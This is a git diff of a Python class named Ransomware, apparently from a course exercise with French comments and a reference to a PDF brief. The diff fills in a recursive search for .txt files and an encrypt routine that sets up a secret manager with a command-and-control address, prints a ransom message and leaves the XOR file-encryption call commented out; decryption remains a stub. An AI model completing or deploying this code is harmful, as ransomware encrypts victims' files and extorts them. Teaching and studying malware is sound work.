@@ -35,13 +35,39 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
+
+        # Indique que le début de la recherche des fichiers se fait depuis le répertoire du fichier
+        p = Path('.') 
+        # Recherche et stock les chemins absolus des fichiers correspondant avec le filtre
+        files = p.rglob('*' + filter) 
+
+        # transforme list_file (objet Path.rglob) en list
+        list_files = list(files) 
+ 
         # return all files matching the filter
-        raise NotImplemented()
+        return list_files
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        
+        # Liste des fichiers correspondants au filtre
+        filtre = '.txt'
+        list_files_to_encrypt = self.get_files(filtre)
+        for file in list_files_to_encrypt:
+            print(file)
 
+        # Création d'un objet SecretManager
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+
+        # Appel de la fonction setup
+        secret_manager.setup()
+
+        # Chiffrement des fichiers
+        # secret_manager.xorfiles(list_files_to_encrypt)
+
+        # Affichage du message
+        print(ENCRYPT_MESSAGE)
+
+              
     def decrypt(self):
         # main function for decrypting (see PDF)
         raise NotImplemented()
